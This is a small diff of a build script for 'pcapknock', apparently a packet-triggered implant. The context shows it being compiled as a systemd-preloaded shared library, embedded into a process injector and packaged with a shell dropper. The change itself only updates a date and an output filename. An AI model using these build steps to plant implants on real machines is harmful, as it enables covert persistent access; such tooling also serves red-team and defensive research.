@@ -4,7 +4,7 @@
 # Build pcapknock for a variety of situations
 # By J. Stuart McMurray
 # Created 20190324
-# Last Modified 20190325
+# Last Modified 20190326
 
 set -e
 
@@ -40,7 +40,7 @@ if [ "Linux" = "$(uname -s)" ]; then
         cc $COPTS -DCONSTRUCTOR -DPRELOAD_SYSTEMD -I$PCAPDIR/include -o "$OUTDIR/pcapknock.systemd.so"       *.c $PCAPDIR/lib/libpcap.a -lpthread -ldl -fPIC -shared -Wl,--version-script=systemd.version
         # Build an injector
         (cd $OUTDIR; xxd -i pcapknock.so) > $INJDIR/pcapknock.so.c
-        cc -DDEBUG $COPTS -I$INJDIR -o $OUTDIR/pcapknock.pid1-injector $INJDIR/*.c -static
+        cc -DDEBUG $COPTS -I$INJDIR -o $OUTDIR/pcapknock.injector $INJDIR/*.c -static
         # Build a dropper for the systemd-only library
         echo '#!/bin/sh'                                                                     >$DROPPER
         echo 'set -e'                                                                       >>$DROPPER
